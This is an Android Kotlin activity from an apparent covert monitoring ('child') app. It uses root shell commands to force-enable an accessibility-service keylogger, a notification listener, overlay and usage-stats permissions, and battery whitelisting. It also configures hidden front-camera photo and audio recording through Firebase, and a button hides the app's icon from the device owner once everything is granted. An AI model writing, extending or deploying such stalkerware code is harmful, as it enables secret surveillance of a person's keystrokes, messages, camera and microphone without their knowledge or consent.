package com.github.muneebwanee.dash.ui.activities.mainchild

import android.Manifest.permission.SYSTEM_ALERT_WINDOW
import android.app.AppOpsManager
import android.os.Bundle
import android.widget.Button
import com.github.muneebwanee.dash.R
import com.github.muneebwanee.dash.data.model.ChildPhoto
import com.github.muneebwanee.dash.data.rxFirebase.InterfaceFirebase
import com.github.muneebwanee.dash.ui.activities.base.BaseActivity
import com.github.muneebwanee.dash.utils.Consts.CHILD_PERMISSION
import com.github.muneebwanee.dash.utils.Consts.CHILD_SHOW_APP
import com.github.muneebwanee.dash.utils.Consts.DATA
import com.github.muneebwanee.dash.utils.Consts.PARAMS
import com.github.muneebwanee.dash.utils.Consts.PHOTO
import com.github.muneebwanee.dash.utils.ConstFun.isNotificationServiceRunning
import com.github.muneebwanee.dash.utils.hiddenCameraServiceUtils.HiddenCameraUtils.canOverDrawOtherApps
import com.github.muneebwanee.dash.utils.hiddenCameraServiceUtils.HiddenCameraUtils.openDrawOverPermissionSetting
import com.github.muneebwanee.dash.utils.hiddenCameraServiceUtils.config.CameraFacing
import com.github.muneebwanee.dash.utils.ConstFun.openUseAccessSettings
import com.github.muneebwanee.dash.utils.checkForegroundApp.CheckPermission.hasUsageStatsPermission
import com.github.muneebwanee.dash.data.model.ChildRecording
import com.github.muneebwanee.dash.utils.Consts.RECORDING
import javax.inject.Inject
import com.google.firebase.database.DatabaseReference
import android.widget.RelativeLayout
import android.widget.Switch
import cn.pedant.SweetAlert.SweetAlertDialog
import com.github.muneebwanee.dash.data.preference.DataSharePreference.childSelected
import com.github.muneebwanee.dash.services.accessibilityData.AccessibilityDataService
import com.github.muneebwanee.dash.utils.ConstFun.isAddWhitelist
import com.github.muneebwanee.dash.utils.ConstFun.isAndroidM
import com.github.muneebwanee.dash.utils.ConstFun.openAccessibilitySettings
import com.github.muneebwanee.dash.utils.ConstFun.openNotificationListenerSettings
import com.github.muneebwanee.dash.utils.ConstFun.openWhitelistSettings
import com.github.muneebwanee.dash.utils.ConstFun.permissionRoot
import com.github.muneebwanee.dash.utils.ConstFun.showApp
import com.github.muneebwanee.dash.utils.Consts
import com.github.muneebwanee.dash.utils.Consts.CHILD_NAME
import com.github.muneebwanee.dash.utils.Consts.COMMAND_ADD_WHITELIST
import com.github.muneebwanee.dash.utils.Consts.COMMAND_ENABLE_ACCESSIBILITY
import com.github.muneebwanee.dash.utils.Consts.COMMAND_ENABLE_ACCESSIBILITY_1
import com.github.muneebwanee.dash.utils.Consts.COMMAND_ENABLE_NOTIFICATION_LISTENER
import com.github.muneebwanee.dash.utils.Consts.COMMAND_GRANT_PERMISSION
import com.github.muneebwanee.dash.utils.Consts.DEVICE_NAME
import com.github.muneebwanee.dash.utils.Consts.INTERVAL
import com.github.muneebwanee.dash.utils.Consts.PERMISSION_USAGE_STATS
import com.github.muneebwanee.dash.utils.Consts.TIMER
import com.github.muneebwanee.dash.utils.async.AsyncTaskRunCommand
import com.github.muneebwanee.dash.utils.checkForegroundApp.CheckPermission.getModeManager
import com.jaredrummler.android.device.DeviceName
import com.pawegio.kandroid.show
import kotterknife.bindView

/**
 * Created by muneebwanee on 15/12/20.
 */
class MainChildActivity : BaseActivity(R.layout.activity_main_child) {

    private val btnHideApp: Button by bindView(R.id.btn_hide_app)
    private val btnEnableService: RelativeLayout by bindView(R.id.btn_enable_service)
    private val btnEnableOverDraw: RelativeLayout by bindView(R.id.btn_enable_overdraw)
    private val btnEnableUsageStats: RelativeLayout by bindView(R.id.btn_enable_usage_stats)
    private val btnEnableNotificationListener : RelativeLayout by bindView(R.id.btn_enable_service_notification)
    private val btnWhitelist : RelativeLayout by bindView(R.id.btn_add_whitelist)
    private val switchOverDraw: Switch by bindView(R.id.switch_overdraw)
    private val switchUsageStats: Switch  by bindView(R.id.switch_usage_stats)
    private val switchAccessibility : Switch by bindView(R.id.switch_accessibility)
    private val switchNotificationListener : Switch by bindView(R.id.switch_notification)
    private val switchWhitelist : Switch by bindView(R.id.switch_add_whitelist)

    @Inject
    lateinit var firebase: InterfaceFirebase

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        getComponent()!!.inject(this)
        init()
        onClickApp()
    }

    override fun onResume() {
        super.onResume()
        checkSwitchPermissions()
    }

    private fun init() {

        //data
        getReference("$DATA/$CHILD_SHOW_APP").setValue(true)
        getReference("$DATA/$CHILD_NAME").setValue(childSelected)
        getReference("$DATA/$DEVICE_NAME").setValue(DeviceName.getDeviceName())

        //photo
        val childPhoto = ChildPhoto(false, CameraFacing.FRONT_FACING_CAMERA)
        getReference("$PHOTO/$PARAMS").setValue(childPhoto)
        getReference("$PHOTO/$CHILD_PERMISSION").setValue(true)

        //Recording
        val childRecording = ChildRecording(false,0)
        getReference("$RECORDING/$PARAMS").setValue(childRecording)
        getReference("$RECORDING/$TIMER/$INTERVAL").setValue(0)

    }

    private fun checkSwitchPermissions() {
        switchOverDraw.isChecked = canOverDrawOtherApps()
        switchUsageStats.isChecked = hasUsageStatsPermission()
        switchAccessibility.isChecked = AccessibilityDataService.isRunningService
        switchNotificationListener.isChecked = isNotificationServiceRunning()
        if (isAndroidM()){
            switchWhitelist.isChecked = isAddWhitelist()
            btnWhitelist.show()
        }
    }

    private fun onClickApp() {
        btnHideApp.setOnClickListener {
            checkPermissions()
        }
        btnEnableService.setOnClickListener {



            if (!AccessibilityDataService.isRunningService){
                permissionRoot {
                    if (it) activatePermissionRoot("$COMMAND_ENABLE_ACCESSIBILITY$packageName/$packageName.services.accessibilityData.AccessibilityDataService",false){
                        activatePermissionRoot(COMMAND_ENABLE_ACCESSIBILITY_1,true){
                            switchAccessibility.isChecked = AccessibilityDataService.isRunningService
                        }
                    }else dialog(SweetAlertDialog.NORMAL_TYPE,R.string.msg_dialog_enable_keylogger){ openAccessibilitySettings() }
                }
            }else showMessage(R.string.already_activated)
        }
        btnEnableOverDraw.setOnClickListener {
            if (!canOverDrawOtherApps()){
                permissionRoot {
                    if (it){
                        val mode = getModeManager(AppOpsManager.OPSTR_SYSTEM_ALERT_WINDOW)
                        if (mode == AppOpsManager.MODE_DEFAULT)
                            activatePermissionRoot("$COMMAND_GRANT_PERMISSION$packageName $SYSTEM_ALERT_WINDOW",true){
                                switchOverDraw.isChecked = canOverDrawOtherApps()
                            }
                        else dialog(SweetAlertDialog.NORMAL_TYPE,R.string.msg_dialog_enable_overdraw){ openDrawOverPermissionSetting() }
                    }else dialog(SweetAlertDialog.NORMAL_TYPE,R.string.msg_dialog_enable_overdraw){ openDrawOverPermissionSetting() }
                }
            }else showMessage(R.string.already_activated)
        }

        btnEnableUsageStats.setOnClickListener {
            if (!hasUsageStatsPermission()){
                permissionRoot {
                    if (it) {
                        val mode = getModeManager(AppOpsManager.OPSTR_GET_USAGE_STATS)
                        if (mode == AppOpsManager.MODE_DEFAULT)
                            activatePermissionRoot("$COMMAND_GRANT_PERMISSION$packageName $PERMISSION_USAGE_STATS",true){
                                switchUsageStats.isChecked = hasUsageStatsPermission()
                            }
                        else dialog(SweetAlertDialog.NORMAL_TYPE,R.string.msg_dialog_enable_usage_stats){ openUseAccessSettings() }
                    }else dialog(SweetAlertDialog.NORMAL_TYPE,R.string.msg_dialog_enable_usage_stats){ openUseAccessSettings() }
                }
            }else showMessage(R.string.already_activated)
        }

        btnEnableNotificationListener.setOnClickListener {
            if (!isNotificationServiceRunning()){
                permissionRoot {
                    if (it) activatePermissionRoot("$COMMAND_ENABLE_NOTIFICATION_LISTENER$packageName/$packageName.services.notificationService.NotificationService",true){
                        switchNotificationListener.isChecked = isNotificationServiceRunning()
                    }else openNotificationListenerSettings()
                }
            }else showMessage(R.string.already_activated)
        }
        btnWhitelist.setOnClickListener {
            if (!isAddWhitelist()){
                permissionRoot {
                    if (it) activatePermissionRoot("$COMMAND_ADD_WHITELIST$packageName",true){
                        switchWhitelist.isChecked = isAddWhitelist()
                    }else openWhitelistSettings()
                }
            }else showMessage(R.string.already_activated)
        }
    }

    private fun getReference(child: String): DatabaseReference = firebase.getDatabaseReference(child)

    private fun checkPermissions() {
        if (hasUsageStatsPermission() && canOverDrawOtherApps() && isNotificationServiceRunning() &&
                AccessibilityDataService.isRunningService && isAddWhitelist()) {
            showDialog(SweetAlertDialog.PROGRESS_TYPE,R.string.hiding,null,null){ show() }
            showApp(false)
            getReference("$DATA/$CHILD_SHOW_APP").setValue(false)
        }else dialog(SweetAlertDialog.NORMAL_TYPE,R.string.enable_all_permissions)
    }

    private fun activatePermissionRoot(command:String,showDialog:Boolean,activate:()->Unit){
        AsyncTaskRunCommand({
            showDialog(SweetAlertDialog.PROGRESS_TYPE,R.string.activating,null,0){show()}
        },{
            hideDialog()
            if (it){
                activate()
                if (showDialog) dialog(SweetAlertDialog.SUCCESS_TYPE,R.string.activated_success)
            }else dialog(SweetAlertDialog.ERROR_TYPE,R.string.failed_activate)
        }).execute(command)
    }

    private fun dialog(type:Int,msg:Int,action:(()->Unit)?=null){
        showDialog(type,R.string.title_dialog,getString(msg),android.R.string.ok){
            setConfirmClickListener { hideDialog() ; if (action!=null) action() } ; show()
        }
    }

    override fun onDestroy() {
        hideDialog()
        super.onDestroy()
    }
}
